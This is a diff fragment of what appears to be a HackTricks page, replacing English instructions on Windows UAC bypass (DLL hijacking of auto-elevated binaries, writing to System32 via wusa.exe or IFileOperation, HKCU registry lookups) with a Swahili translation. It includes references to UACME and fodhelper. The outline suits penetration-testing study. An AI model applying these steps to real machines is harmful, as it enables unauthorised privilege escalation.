-2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
-3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
-1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
-2. **IFileOperation**: Windows 10.
-4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.
+1. Tafuta binary ambayo ita **autoelevate** (angalia kwamba inapoendeshwa inaendesha kwenye high integrity level).
+2. Kwa kutumia procmon tafuta matukio ya "**NAME NOT FOUND**" ambayo yanaweza kuwa dhaifu kwa **DLL Hijacking**.
+3. Huenda utahitaji **kuandika** DLL ndani ya baadhi ya **protected paths** (kama C:\Windows\System32) ambapo huna ruhusa ya kuandika. Unaweza kupita hili kwa kutumia:
+   1. **wusa.exe**: Windows 7,8 na 8.1. Inaruhusu kutoa yaliyomo ya CAB ndani ya protected paths (kwa sababu zana hii inaendeshwa kutoka high integrity level).
+   2. **IFileOperation**: Windows 10.
+4. Andaa **script** ili kunakili DLL yako ndani ya protected path na uendeshe binary dhaifu na autoelevated.
 
 ### Another UAC bypass technique
 
-Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).
+Inajumuisha kuangalia kama **autoElevated binary** inajaribu **kusoma** kutoka kwa **registry** jina/nafasi ya **binary** au **command** itakayotekelezwa (hii inakuwa ya kuvutia zaidi ikiwa binary inatafuta taarifa hii ndani ya **HKCU**).
+
+## References
+- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
+- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
+- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
+- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
 
 {{#include ../../banners/hacktricks-training.md}}
